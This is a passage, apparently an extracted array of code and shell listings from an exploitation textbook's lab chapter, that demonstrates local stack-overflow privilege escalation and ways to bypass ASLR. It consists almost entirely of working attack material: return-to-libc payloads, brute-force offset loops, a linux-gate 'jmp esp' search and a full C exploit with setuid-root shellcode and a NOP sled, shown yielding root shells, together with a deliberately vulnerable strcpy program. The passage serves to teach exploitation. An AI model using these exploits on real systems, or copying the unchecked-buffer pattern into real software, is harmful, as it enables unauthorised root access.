main\nBreakpoint 1 at 0x804837a\n(gdb) run\nStarting program: /home/matrix/booksrc/dummy\n\nBreakpoint 1, 0x0804837a in main ()\n(gdb) print system\n$1 = {<text variable, no debug info>} 0xb7ed0d80 <system>\n(gdb) quit\n```", "```\nreader@hacking:~/booksrc $ export BINSH=\"         /bin/sh\"\nreader@hacking:~/booksrc $ ./getenvaddr BINSH ./vuln\nBINSH will be at 0xbffffe5b\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./vuln $(perl -e 'print \"ABCD\"x5')\nreader@hacking:~/booksrc $ ./vuln $(perl -e 'print \"ABCD\"x10')\nSegmentation fault\nreader@hacking:~/booksrc $ ./vuln $(perl -e 'print \"ABCD\"x8')\nSegmentation fault\nreader@hacking:~/booksrc $ ./vuln $(perl -e 'print \"ABCD\"x7')\nIllegal instruction\nreader@hacking:~/booksrc $ ./vuln $(perl -e 'print \"ABCD\"x7 . \"\\x80\\x0d\\xed\\xb7FAKE\\x5b\n\\xfe\\\nxff\\xbf\"')\nsh-3.2# whoami\nroot\nsh-3.2#\n```", "```\nreader@hacking:~/booksrc $ sudo su -\nroot@hacking:~ # echo 1 > /proc/sys/kernel/randomize_va_space\nroot@hacking:~ # exit\nlogout\nreader@hacking:~/booksrc $ gcc exploit_notesearch.c\nreader@hacking:~/booksrc $ ./a.out\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n-------[ end of note data ]-------\nreader@hacking:~/booksrc $\n```", "```\n#include <stdio.h>\n\nint main(int argc, char *argv[]) {\n   char buffer[50];\n\n   printf(\"buffer is at %p\\n\", &buffer);\n\n   if(argc > 1)\n      strcpy(buffer, argv[1]);\n\n   return 1;\n}\n```", "```\nreader@hacking:~/booksrc $ gcc -g -o aslr_demo aslr_demo.c\nreader@hacking:~/booksrc $ ./aslr_demo\nbuffer is at 0xbffbbf90\nreader@hacking:~/booksrc $ ./aslr_demo\nbuffer is at 0xbfe4de20\nreader@hacking:~/booksrc $ ./aslr_demo\nbuffer is at 0xbfc7ac50\nreader@hacking:~/booksrc $ ./aslr_demo $(perl -e 'print \"ABCD\"x20')\nbuffer is at 0xbf9a4920\nSegmentation fault\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./aslr_demo\nSHELLCODE will be at 0xbfd919c3\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./aslr_demo\nSHELLCODE will be at 0xbfe499c3\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./aslr_demo\nSHELLCODE will be at 0xbfcae9c3\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./aslr_demo test\nbuffer is at 0xbfb80320\nreader@hacking:~/booksrc $ echo $?\n1\nreader@hacking:~/booksrc $ ./aslr_demo $(perl -e 'print \"AAAA\"x50')\nbuffer is at 0xbfbe2ac0\nSegmentation fault\nreader@hacking:~/booksrc $ echo $?\n139\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ for i in $(seq 1 50)\n> do\n> echo \"Trying offset of $i words\"\n> ./aslr_demo $(perl -e \"print 'AAAA'x$i\")\n> if [ $? != 1 ]\n> then\n> echo \"==>  Correct offset to return address is $i words\"\n> break\n> fi\n> done\nTrying offset of 1 words\nbuffer is at 0xbfc093b0\nTrying offset of 2 words\nbuffer is at 0xbfd01ca0\nTrying offset of 3 words\nbuffer is at 0xbfe45de0\nTrying offset of 4 words\nbuffer is at 0xbfdcd560\nTrying offset of 5 words\nbuffer is at 0xbfbf5380\nTrying offset of 6 words\nbuffer is at 0xbffce760\nTrying offset of 7 words\nbuffer is at 0xbfaf7a80\nTrying offset of 8 words\nbuffer is at 0xbfa4e9d0\nTrying offset of 9 words\nbuffer is at 0xbfacca50\nTrying offset of 10 words\nbuffer is at 0xbfd08c80\nTrying offset of 11 words\nbuffer is at 0xbff24ea0\nTrying offset of 12 words\nbuffer is at 0xbfaf9a70\nTrying offset of 13 words\nbuffer is at 0xbfe0fd80\nTrying offset of 14 words\nbuffer is at 0xbfe03d70\nTrying offset of 15 words\nbuffer is at 0xbfc2fb90\nTrying offset of 16 words\nbuffer is at 0xbff32a40\nTrying offset of 17 words\nbuffer is at 0xbf9da940\nTrying offset of 18 words\nbuffer is at 0xbfd0cc70\nTrying offset of 19 words\nbuffer is at 0xbf897ff0\nIllegal instruction\n==>  Correct offset to return address is 19 words\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ gdb -q ./aslr_demo\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) disass main\nDump of assembler code for function main:\n0x080483b4 <main+0>:    push   ebp\n0x080483b5 <main+1>:    mov    ebp,esp\n0x080483b7 <main+3>:    sub    esp,0x58\n0x080483ba <main+6>:    and    esp,0xfffffff0\n0x080483bd <main+9>:    mov    eax,0x0\n0x080483c2 <main+14>:   sub    esp,eax\n0x080483c4 <main+16>:   lea    eax,[ebp-72]\n0x080483c7 <main+19>:   mov    DWORD PTR [esp+4],eax\n0x080483cb <main+23>:   mov    DWORD PTR [esp],0x80484d4\n0x080483d2 <main+30>:   call   0x80482d4 <printf@plt>\n0x080483d7 <main+35>:   cmp    DWORD PTR [ebp+8],0x1\n0x080483db <main+39>:   jle    0x80483f4 <main+64>\n0x080483dd <main+41>:   mov    eax,DWORD PTR [ebp+12]\n0x080483e0 <main+44>:   add    eax,0x4\n0x080483e3 <main+47>:   mov    eax,DWORD PTR [eax]\n0x080483e5 <main+49>:   mov    DWORD PTR [esp+4],eax\n0x080483e9 <main+53>:   lea    eax,[ebp-72]\n0x080483ec <main+56>:   mov    DWORD PTR [esp],eax\n0x080483ef <main+59>:   call   0x80482c4 <strcpy@plt>\n0x080483f4 <main+64>:   mov    eax,0x1\n0x080483f9 <main+69>:   leave\n0x080483fa <main+70>:   ret\nEnd of assembler dump.\n(gdb) break *0x080483fa\nBreakpoint 1 at 0x80483fa: file aslr_demo.c, line 12.\n(gdb)\n```", "```\n(gdb) run\nStarting program: /home/reader/booksrc/aslr_demo\n`buffer is at 0xbfa131a0`\n\nBreakpoint 1, 0x080483fa in main (argc=134513588, argv=0x1) at aslr_demo.c:12\n12      }\n(gdb) info registers\neax            0x1      1\necx            0x0      0\nedx            0xb7f000b0       -1209007952\nebx            0xb7efeff4       -1209012236\n`esp            0xbfa131`ec       0xbfa131ec\nebp            0xbfa13248       0xbfa13248\nesi            0xb7f29ce0       -1208836896\nedi            0x0      0\neip            0x80483fa        0x80483fa <main+70>\neflags         0x200246 [ PF ZF IF ID ]\ncs             0x73     115\nss             0x7b     123\nds             0x7b     123\nes             0x7b     123\nfs             0x0      0\ngs             0x33     51\n(gdb) run\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/reader/booksrc/aslr_demo\n`buffer is at 0xbfd8e5`20\n\nBreakpoint 1, 0x080483fa in main (argc=134513588, argv=0x1) at aslr_demo.c:12\n12      }\n(gdb) i r esp\n`esp            0xbfd8e5`6c       0xbfd8e56c\n(gdb) run\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/reader/booksrc/aslr_demo\n`buffer is at 0xbfaada`40\n\nBreakpoint 1, 0x080483fa in main (argc=134513588, argv=0x1) at aslr_demo.c:12\n12      }\n(gdb) i r esp\n`esp            0xbfaada`8c      0xbfaada8c\n(gdb)\n```", "```\n(gdb) run\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/reader/booksrc/aslr_demo\nbuffer is at 0xbfd1ccb0\n\nBreakpoint 1, 0x080483fa in main (argc=134513588, argv=0x1) at aslr_demo.c:12\n12      }\n(gdb) i r esp\nesp            0xbfd1ccfc       0xbfd1ccfc\n(gdb) stepi\n0xb7e4debc in __libc_start_main () from /lib/tls/i686/cmov/libc.so.6\n(gdb) i r esp\nesp            0xbfd1cd00       0xbfd1cd00\n(gdb) x/24x 0xbfd1ccb0\n0xbfd1ccb0:     0x00000000      0x080495cc      0xbfd1ccc8      0x08048291\n0xbfd1ccc0:     0xb7f3d729      0xb7f74ff4      0xbfd1ccf8      0x08048429\n0xbfd1ccd0:     0xb7f74ff4      0xbfd1cd8c      0xbfd1ccf8      0xb7f74ff4\n0xbfd1cce0:     0xb7f937b0      0x08048410      0x00000000      0xb7f74ff4\n0xbfd1ccf0:     0xb7f9fce0      0x08048410      0xbfd1cd58      0xb7e4debc\n`0xbfd1cd00:     0x00000001`      0xbfd1cd84      0xbfd1cd8c      0xb7fa0898\n(gdb) p 0xbfd1cd00 - 0xbfd1ccb0\n$1 = 80\n(gdb) p 80/4\n$2 = 20\n(gdb)\n```", "```\nmatrix@loki /hacking $ $ uname -a\nLinux hacking 2.6.17 #2 SMP Sun Apr 11 03:42:05 UTC 2007 i686 GNU/Linux\nmatrix@loki /hacking $ cat /proc/sys/kernel/randomize_va_space\n1\nmatrix@loki /hacking $ ldd ./aslr_demo\n        `linux-gate.so.1 =>  (0xffffe000)`\n        libc.so.6 => /lib/libc.so.6 (0xb7eb2000)\n        /lib/ld-linux.so.2 (0xb7fe5000)\nmatrix@loki /hacking $ ldd /bin/ls\n        `linux-gate.so.1 =>  (0xffffe000)`\n        librt.so.1 => /lib/librt.so.1 (0xb7f95000)\n        libc.so.6 => /lib/libc.so.6 (0xb7e75000)\n        libpthread.so.0 => /lib/libpthread.so.0 (0xb7e62000)\n        /lib/ld-linux.so.2 (0xb7fb1000)\nmatrix@loki /hacking $ ldd /bin/ls\n        `linux-gate.so.1 =>  (0xffffe000)`\n        librt.so.1 => /lib/librt.so.1 (0xb7f50000)\n        libc.so.6 => /lib/libc.so.6 (0xb7e30000)\n        libpthread.so.0 => /lib/libpthread.so.0 (0xb7e1d000)\n        /lib/ld-linux.so.2 (0xb7f6c000)\nmatrix@loki /hacking $\n```", "```\nmatrix@loki /hacking $ cat > jmpesp.s\nBITS 32\njmp esp\nmatrix@loki /hacking $ nasm jmpesp.s\nmatrix@loki /hacking $ hexdump -C jmpesp\n00000000  ff e4                                             |..|\n00000002\nmatrix@loki /hacking $\n```", "```\nint main()\n{\n  unsigned long linuxgate_start = 0xffffe000;\n  char *ptr = (char *) linuxgate_start;\n\n  int i;\n\n  for(i=0; i < 4096; i++)\n  {\n    if(ptr[i] == '\\xff' && ptr[i+1] == '\\xe4')\n      printf(\"found jmp esp at %p\\n\", ptr+i);\n  }\n}\n```", "```\nmatrix@loki /hacking $ ./find_jmpesp\nfound jmp esp at 0xffffe777\nmatrix@loki /hacking $ gdb -q ./aslr_demo\nUsing host libthread_db library \"/lib/libthread_db.so.1\".\n(gdb) break main\nBreakpoint 1 at 0x80483f0: file aslr_demo.c, line 7.\n(gdb) run\nStarting program: /hacking/aslr_demo\n\nBreakpoint 1, main (argc=1, argv=0xbf869894) at aslr_demo.c:7\n7               printf(\"buffer is at %p\\n\", &buffer);\n(gdb) x/i 0xffffe777\n0xffffe777:     jmp    esp\n(gdb)\n```", "```\nmatrix@loki /hacking $ sudo chown root:root ./aslr_demo\nmatrix@loki /hacking $ sudo chmod u+s ./aslr_demo\nmatrix@loki /hacking $ ./aslr_demo $(perl -e 'print \"\\x77\\xe7\\xff\\xff\"x20')$(cat\n scode.bin)\nbuffer is at 0xbf8d9ae0\nsh-3.1#\n```", "```\nmatrix@loki /hacking $ for i in `seq 1 50`; do ./notesearch $(perl -e \"print 'AAAA'x$i\");\n if [ \n$? == 139 ]; then echo \"Try $i words\"; break; fi; done\n[DEBUG] found a 34 byte note for user id 1000\n[DEBUG] found a 41 byte note for user id 1000\n[DEBUG] found a 63 byte note for user id 1000\n-------[ end of note data ]-------\n\n*** OUTPUT TRIMMED ***\n\n[DEBUG] found a 34 byte note for user id 1000\n[DEBUG] found a 41 byte note for user id 1000\n[DEBUG] found a 63 byte note for user id 1000\n-------[ end of note data ]-------\nSegmentation fault\nTry 35 words\nmatrix@loki /hacking $ ./notesearch $(perl -e 'print \"\\x77\\xe7\\xff\\xff\"x35')$(cat\n scode.bin)\n[DEBUG] found a 34 byte note for user id 1000\n[DEBUG] found a 41 byte note for user id 1000\n[DEBUG] found a 63 byte note for user id 1000\n-------[ end of note data ]-------\nSegmentation fault\nmatrix@loki /hacking $ ./notesearch $(perl -e 'print \"\\x77\\xe7\\xff\\xff\"x36')$(cat\n scode2.bin)\n[DEBUG] found a 34 byte note for user id 1000\n[DEBUG] found a 41 byte note for user id 1000\n[DEBUG] found a 63 byte note for user id 1000\n-------[ end of note data ]------- \nsh-3.1#\n```", "```\nreader@hacking:~/booksrc $ uname -a\nLinux hacking 2.6.20-15-generic #2 SMP Sun Apr 15 07:36:31 UTC 2007 i686 GNU/Linux\nreader@hacking:~/booksrc $ gcc -o find_jmpesp find_jmpesp.c\nreader@hacking:~/booksrc $ ./find_jmpesp\nreader@hacking:~/booksrc $ gcc -g -o aslr_demo aslr_demo.c\nreader@hacking:~/booksrc $ ./aslr_demo test\nbuffer is at 0xbfcf3480\nreader@hacking:~/booksrc $ ./aslr_demo test\nbuffer is at 0xbfd39cd0\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./aslr_demo\nSHELLCODE will be at 0xbfc8d9c3\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./aslr_demo\nSHELLCODE will be at 0xbfa0c9c3\nreader@hacking:~/booksrc $\n```", "```\nEXEC(3)                Linux Programmer's Manual\n\nNAME\n       execl, execlp, execle, execv, execvp - execute a file\n\nSYNOPSIS\n       #include <unistd.h>\n\n       extern char **environ;\n\n       int execl(const char *path, const char *arg, ...);\n       int execlp(const char *file, const char *arg, ...);\n       int execle(const char *path, const char *arg,\n                  ..., char * const envp[]);\n       int execv(const char *path, char *const argv[]);\n       int execvp(const char *file, char *const argv[]);\n\nDESCRIPTION\n       The  exec()  family  of  functions  replaces the current process\n       image with a new process image.  The functions described in this\n       manual page are front-ends for the function execve(2).  (See the\n       manual page for execve()  for  detailed  information  about  the\n       replacement of the current process.)\n```", "```\n#include <stdio.h>\n#include <unistd.h>\n\nint main(int argc, char *argv[]) {\n   int stack_var;\n\n   // Print an address from the current stack frame.\n   printf(\"stack_var is at %p\\n\", &stack_var);\n\n   // Start aslr_demo to see how its stack is arranged.\n   execl(\"./aslr_demo\", \"aslr_demo\", NULL);\n}\n```", "```\nreader@hacking:~/booksrc $ gcc -o aslr_demo aslr_demo.c\nreader@hacking:~/booksrc $ gcc -o aslr_execl aslr_execl.c\nreader@hacking:~/booksrc $ ./aslr_demo test\nbuffer is at 0xbf9f31c0\nreader@hacking:~/booksrc $ ./aslr_demo test\nbuffer is at 0xbffaaf70\nreader@hacking:~/booksrc $ ./aslr_execl\nstack_var is at 0xbf832044\nbuffer is at 0xbf832000\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xbf832044 - 0xbf832000\"\n$1 = 68\nreader@hacking:~/booksrc $ ./aslr_execl\nstack_var is at 0xbfa97844\nbuffer is at 0xbf82f800\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xbfa97844 - 0xbf82f800\"\n$1 = 2523204\nreader@hacking:~/booksrc $ ./aslr_execl\nstack_var is at 0xbfbb0bc4\nbuffer is at 0xbff3e710\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xbfbb0bc4 - 0xbff3e710\"\n$1 = 4291241140\nreader@hacking:~/booksrc $ ./aslr_execl\nstack_var is at 0xbf9a81b4\nbuffer is at 0xbf9a8180\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xbf9a81b4 - 0xbf9a8180\"\n$1 = 52\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ gdb -q ./aslr_demo\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) run $(perl -e 'print \"AAAA\"x19 . \"BBBB\"')\nStarting program: /home/reader/booksrc/aslr_demo $(perl -e 'print \"AAAA\"x19 . \"BBBB\"')\nbuffer is at 0xbfc7d3b0\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x42424242 in ?? ()\n(gdb) p 20*4\n$1 = 80\n(gdb) quit\nThe program is running.  Exit anyway? (y or n) y\nreader@hacking:~/booksrc $\n```", "```\n#include <stdio.h>\n#include <unistd.h>\n#include <string.h>\n\nchar shellcode[]=\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\n\"\\xe1\\xcd\\x80\"; // Standard shellcode\n\nint main(int argc, char *argv[]) {\n   unsigned int i, ret, offset;\n   char buffer[1000];\n\n   printf(\"i is at %p\\n\", &i);\n\n   if(argc > 1) // Set offset.\n      offset = atoi(argv[1]);\n\n   ret = (unsigned int) &i - offset + 200; // Set return address.\n   printf(\"ret addr is %p\\n\", ret);\n\nfor(i=0; i < 90; i+=4) // Fill buffer with return address.\n     *((unsigned int *)(buffer+i)) = ret;\n  memset(buffer+84, 0x90, 900); // Build NOP sled.\n  memcpy(buffer+900, shellcode, sizeof(shellcode));\n\n  execl(\"./aslr_demo\", \"aslr_demo\", buffer,  NULL);\n}\n```", "```\nreader@hacking:~/booksrc $ sudo chown root ./aslr_demo\nreader@hacking:~/booksrc $ sudo chmod u+s ./aslr_demo\nreader@hacking:~/booksrc $ gcc aslr_execl_exploit.c\nreader@hacking:~/booksrc $ ./a.out\ni is at 0xbfa3f26c\nret addr is 0xb79f6de4\nbuffer is at 0xbfa3ee80\nSegmentation fault\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xbfa3f26c - 0xbfa3ee80\"\n$1 = 1004\nreader@hacking:~/booksrc $ ./a.out 1004\ni is at 0xbfe9b6cc\nret addr is 0xbfe9b3a8\nbuffer is at 0xbfe9b2e0\nsh-3.2# exit\nexit\nreader@hacking:~/booksrc $ ./a.out 1004\ni is at 0xbfb5a38c\nret addr is 0xbfb5a068\nbuffer is at 0xbfb20760\nSegmentation fault\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xbfb5a38c - 0xbfb20760\"\n$1 = 236588\nreader@hacking:~/booksrc $ ./a.out 1004\ni is at 0xbfce050c\nret addr is 0xbfce01e8\nbuffer is at 0xbfce0130\nsh-3.2# whoami\nroot \nsh-3.2#\n```"]